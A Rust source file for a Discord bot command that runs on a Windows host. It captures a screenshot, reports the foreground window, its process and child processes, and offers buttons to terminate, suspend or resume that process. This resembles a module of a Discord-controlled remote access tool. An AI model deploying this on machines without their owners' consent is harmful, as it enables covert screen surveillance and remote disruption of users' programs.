use crate::prelude::*;
use crate::core::screenshot::Screenshot;
use winapi::um::winuser::{GetForegroundWindow, GetWindowThreadProcessId, GetWindowTextW, GetWindowTextLengthW};
use winapi::um::processthreadsapi::{OpenProcess, OpenThread, SuspendThread, ResumeThread, TerminateProcess};
use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, PROCESS_TERMINATE, THREAD_SUSPEND_RESUME};
use winapi::um::psapi::GetModuleBaseNameW;
use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, Thread32First, Thread32Next, PROCESSENTRY32W, THREADENTRY32, TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD};
use winapi::shared::minwindef::{DWORD, FALSE};
use std::ffi::OsString;
use std::os::windows::ffi::OsStringExt;
use std::time::Duration;

#[poise::command(prefix_command, aliases("fg"))]
pub async fn foreground(ctx: PoiseContext<'_>) -> Result<(), Error> {
    let reply = ctx.say("Analyzing foreground...").await?;

    let result = tokio::task::spawn_blocking(move || -> Result<(Vec<u8>, String, u32, String), anyhow::Error> {
        let (buffer, _) = Screenshot::capture_as_bytes()?;

        let (hwnd, pid, title) = get_foreground_info();
        let process_name = get_process_name(pid).unwrap_or("Unknown".to_string());
        let children = get_child_processes(pid);
        
        let mut description = format!(
            "**Window:** {}\n**Process:** {} (PID: {})\n**HWND:** 0x{:X}",
            title, process_name, pid, hwnd
        );
        
        if !children.is_empty() {
            description.push_str("\n**Children:**\n```\n");
            for (c_pid, c_name) in children.iter().take(5) {
                description.push_str(&format!("• {} ({})\n", c_name, c_pid));
            }
            if children.len() > 5 {
                description.push_str(&format!("... +{} more\n", children.len() - 5));
            }
            description.push_str("```");
        }
        
        Ok((buffer, description, pid, process_name))
    }).await;

    let (buffer, description, pid, process_name) = match result {
        Ok(Ok(val)) => val,
        Ok(Err(e)) => {
            reply.edit(ctx, poise::CreateReply::default().content(format!("Error: {}", e))).await?;
            return Ok(());
        }
        Err(e) => {
            reply.edit(ctx, poise::CreateReply::default().content(format!("Task Error: {}", e))).await?;
            return Ok(());
        }
    };

    reply.delete(ctx).await?;
    
    let attachment = serenity::CreateAttachment::bytes(buffer, "foreground.png");
    
    let crash_id = format!("fg_crash_{}", pid);
    let freeze_id = format!("fg_freeze_{}", pid);
    let unfreeze_id = format!("fg_unfreeze_{}", pid);
    
    let components = vec![
        serenity::CreateActionRow::Buttons(vec![
            serenity::CreateButton::new(&crash_id)
                .label("Crash")
                .style(serenity::ButtonStyle::Danger),
            serenity::CreateButton::new(&freeze_id)
                .label("Freeze")
                .style(serenity::ButtonStyle::Primary),
            serenity::CreateButton::new(&unfreeze_id)
                .label("Unfreeze")
                .style(serenity::ButtonStyle::Success),
        ])
    ];

    let msg = ctx.send(poise::CreateReply::default()
        .content(description)
        .attachment(attachment)
        .components(components)
    ).await?;

    let message = msg.message().await?;
    if let Some(interaction) = message
        .await_component_interaction(ctx.serenity_context().shard.clone())
        .timeout(Duration::from_secs(20))
        .await
    {
        let custom_id = &interaction.data.custom_id;
        
        if custom_id == &crash_id {
            let success = tokio::task::spawn_blocking(move || crash_process(pid)).await.unwrap_or(false);
            let result_msg = if success { format!("Terminated `{}`", process_name) } else { "Failed to terminate".to_string() };
            interaction.create_response(
                ctx.http(),
                serenity::CreateInteractionResponse::UpdateMessage(
                    serenity::CreateInteractionResponseMessage::new()
                        .content(format!("**Crash:** {}", result_msg))
                        .components(vec![])
                )
            ).await?;
        } else if custom_id == &freeze_id {
            let pid_clone = pid;
            let success = tokio::task::spawn_blocking(move || freeze_process(pid_clone)).await.unwrap_or(false);
            let result_msg = if success { format!("Frozen `{}`", process_name) } else { "Failed to freeze".to_string() };
            
            let unfreeze_components = vec![
                serenity::CreateActionRow::Buttons(vec![
                    serenity::CreateButton::new(&unfreeze_id)
                        .label("Unfreeze")
                        .style(serenity::ButtonStyle::Success),
                ])
            ];
            
            interaction.create_response(
                ctx.http(),
                serenity::CreateInteractionResponse::UpdateMessage(
                    serenity::CreateInteractionResponseMessage::new()
                        .content(format!("**Freeze:** {}", result_msg))
                        .components(unfreeze_components)
                )
            ).await?;
            
            if let Some(unfreeze_interaction) = message
                .await_component_interaction(ctx.serenity_context().shard.clone())
                .timeout(Duration::from_secs(20))
                .await
            {
                let success = tokio::task::spawn_blocking(move || unfreeze_process(pid)).await.unwrap_or(false);
                let result_msg = if success { format!("Unfrozen `{}`", process_name) } else { "Failed to unfreeze".to_string() };
                unfreeze_interaction.create_response(
                    ctx.http(),
                    serenity::CreateInteractionResponse::UpdateMessage(
                        serenity::CreateInteractionResponseMessage::new()
                            .content(format!("**Unfreeze:** {}", result_msg))
                            .components(vec![])
                    )
                ).await?;
            } else {
                msg.edit(ctx, poise::CreateReply::default()
                    .content("*Controls expired*")
                    .components(vec![])
                ).await?;
            }
        } else if custom_id == &unfreeze_id {
            let success = tokio::task::spawn_blocking(move || unfreeze_process(pid)).await.unwrap_or(false);
            let result_msg = if success { format!("Unfrozen `{}`", process_name) } else { "Failed to unfreeze".to_string() };
            interaction.create_response(
                ctx.http(),
                serenity::CreateInteractionResponse::UpdateMessage(
                    serenity::CreateInteractionResponseMessage::new()
                        .content(format!("**Unfreeze:** {}", result_msg))
                        .components(vec![])
                )
            ).await?;
        }

    } else {
        msg.edit(ctx, poise::CreateReply::default()
            .content("*Controls expired*")
            .components(vec![])
        ).await?;
    }

    Ok(())
}

fn get_foreground_info() -> (usize, u32, String) {
    unsafe {
        let hwnd = GetForegroundWindow();
        if hwnd.is_null() {
            return (0, 0, "None".to_string());
        }
        
        let mut pid: DWORD = 0;
        GetWindowThreadProcessId(hwnd, &mut pid);
        
        let len = GetWindowTextLengthW(hwnd);
        let mut title = String::new();
        if len > 0 {
            let mut buf = vec![0u16; (len + 1) as usize];
            GetWindowTextW(hwnd, buf.as_mut_ptr(), len + 1);
            title = OsString::from_wide(&buf[..len as usize]).to_string_lossy().to_string();
        }
        
        (hwnd as usize, pid, title)
    }
}

fn get_process_name(pid: u32) -> Option<String> {
    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
        if handle.is_null() {
            return None;
        }
        
        let mut buf = [0u16; 260];
        let len = GetModuleBaseNameW(handle, std::ptr::null_mut(), buf.as_mut_ptr(), 260);
        winapi::um::handleapi::CloseHandle(handle);
        
        if len > 0 {
            Some(OsString::from_wide(&buf[..len as usize]).to_string_lossy().to_string())
        } else {
            None
        }
    }
}

fn get_child_processes(parent_pid: u32) -> Vec<(u32, String)> {
    let mut children = Vec::new();
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return children;
        }
        
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        
        if Process32FirstW(snapshot, &mut entry) != FALSE {
            loop {
                if entry.th32ParentProcessID == parent_pid {
                    let name = OsString::from_wide(&entry.szExeFile)
                        .to_string_lossy()
                        .trim_matches('\0')
                        .to_string();
                    children.push((entry.th32ProcessID, name));
                }
                
                if Process32NextW(snapshot, &mut entry) == FALSE {
                    break;
                }
            }
        }
        
        winapi::um::handleapi::CloseHandle(snapshot);
    }
    children
}

fn crash_process(pid: u32) -> bool {
    unsafe {
        let handle = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
        if handle.is_null() {
            return false;
        }
        let result = TerminateProcess(handle, 1) != FALSE;
        winapi::um::handleapi::CloseHandle(handle);
        result
    }
}

fn freeze_process(pid: u32) -> bool {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return false;
        }

        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
        
        let mut success = false;
        if Thread32First(snapshot, &mut entry) != FALSE {
            loop {
                if entry.th32OwnerProcessID == pid {
                    let thread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, entry.th32ThreadID);
                    if !thread.is_null() {
                        SuspendThread(thread);
                        winapi::um::handleapi::CloseHandle(thread);
                        success = true;
                    }
                }
                if Thread32Next(snapshot, &mut entry) == FALSE {
                    break;
                }
            }
        }
        
        winapi::um::handleapi::CloseHandle(snapshot);
        success
    }
}

fn unfreeze_process(pid: u32) -> bool {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return false;
        }

        let mut entry: THREADENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
        
        let mut success = false;
        if Thread32First(snapshot, &mut entry) != FALSE {
            loop {
                if entry.th32OwnerProcessID == pid {
                    let thread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, entry.th32ThreadID);
                    if !thread.is_null() {
                        ResumeThread(thread);
                        winapi::um::handleapi::CloseHandle(thread);
                        success = true;
                    }
                }
                if Thread32Next(snapshot, &mut entry) == FALSE {
                    break;
                }
            }
        }
        
        winapi::um::handleapi::CloseHandle(snapshot);
        success
    }
}
